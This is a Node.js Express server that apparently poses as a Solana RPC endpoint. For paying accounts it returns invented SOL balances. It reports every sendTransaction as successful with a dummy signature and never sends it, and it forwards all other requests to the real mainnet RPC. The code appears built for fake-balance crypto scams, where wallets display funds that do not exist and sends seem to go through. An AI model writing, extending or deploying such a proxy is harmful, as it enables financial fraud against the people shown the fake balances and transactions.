require('dotenv').config();
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json({ limit: '10mb' }));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

const REAL_RPC = 'https://api.mainnet-beta.solana.com';
const db = new sqlite3.Database('crucible.db');

const virtualSol = new Map();

function loadVirtualBalances() {
  db.all(`SELECT publicKey, balance FROM users WHERE paid=1 AND failed=0`, (err, rows) => {
    virtualSol.clear();
    if (!err && rows) {
      rows.forEach(r => r.publicKey && virtualSol.set(r.publicKey, Number(r.balance)));
    }
    console.log(`Virtual balances loaded: ${virtualSol.size} accounts`);
  });
}

loadVirtualBalances();
setInterval(loadVirtualBalances, 12000);

app.post('/', async (req, res) => {
  const { method, params = [], id } = req.body || {};
  const pubkey = params[0]?.toString() || params[0];

  try {
    // FAKE SOL BALANCE
    if (method === 'getBalance' && virtualSol.has(pubkey)) {
      const lamports = Math.floor(virtualSol.get(pubkey) * 1_000_000_000);
      return res.json({ jsonrpc: '2.0', id, result: { value: lamports, context: { slot: 999999999 } } });
    }

    // FAKE SUCCESS FOR sendTransaction (prevents spam errors)
    if (method === 'sendTransaction') {
      return res.json({ jsonrpc: '2.0', id, result: '1111111111111111111111111111111111111111111111111111111111111111' });
    }

    // Forward everything else to real RPC
    const r = await axios.post(REAL_RPC, req.body, { timeout: 15000 });
    res.json(r.data);
  } catch (e) {
    console.error('RPC error:', e.message);
    res.json({ jsonrpc: '2.0', id, error: { code: -32603, message: 'Internal error' } });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('FAKE SOL RPC PROXY → LIVE AND BULLETPROOF');
  console.log(`RPC URL → ${process.env.RPC_URL || 'https://your-rpc.onrender.com'}`);
});
